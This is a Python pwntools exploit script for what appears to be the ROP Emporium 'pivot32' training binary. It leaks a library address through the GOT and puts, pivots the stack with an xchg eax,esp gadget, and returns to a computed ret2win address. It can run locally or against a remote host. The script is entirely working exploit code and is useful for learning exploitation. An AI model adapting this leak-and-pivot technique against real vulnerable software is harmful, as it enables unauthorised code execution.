#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    ret2winOff = 0x967
    footholdOff = 0x770
    xchngEAXESP = 0x080488c2
    footholdPLT = 0x80485F0
    puts = 0x80485D0
    footholdGOT = 0x804A024
    pwnme = 0x80487F2
    main = 0x804873B

    print r.recvuntil("pivot: ")
    pivot_addr = r.recvn(10)
    print("ADDR: ",pivot_addr)
    r.recvuntil(">")
    
    buf = ""
    buf += "A"*200 #fill first buffer but do not use
    r.sendline(buf)
    
    r.recvuntil(">")
    buf2 = ""
    buf2 += p32(footholdPLT) #call foothold through the plt; foothold got.plt will now be filled
    buf2 += p32(puts) #call puts with the address of foothold.got.plt; this has the address of foothold in the library now 
    buf2 += p32(main) #call main to do second stage since we can now calculate addr of RET2WIN
    buf2 += p32(footholdGOT) # arg to puts
    buf2 += "B"*(cyclic_find("laaa") - len(buf2))
    buf2 += p32(xchngEAXESP) #first ret; moves esp to top of buf2
    r.sendline(buf2)


    r.recvuntil(".so") #recv all output of call to foothold function
    foothold_addr_got = u32(r.recvn(4)) #recv addr from puts call
    print("foothold_addr_got: ", hex(foothold_addr_got))
    ret2_addr = (foothold_addr_got - footholdOff) + ret2winOff #calc ret2win addr
    print("ret2_addr: ", hex(ret2_addr))
    #---------------- STAGE 2 ------------------------------------------------#
    r.recvuntil(">")
    buf3 = ""
    buf3 += "A"*200
    r.sendline(buf)
    
    r.recvuntil(">")
    buf4 = ""
    buf4 += p32(ret2_addr)
    buf4 += "B"*(cyclic_find("laaa") - len(buf4))
    buf4 += p32(xchngEAXESP)
    r.sendline(buf4)    


    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./pivot32"        #put binary name here
    e = ELF(binary_name)
    libc =  ELF("./libpivot32.so")
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x80488A0",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)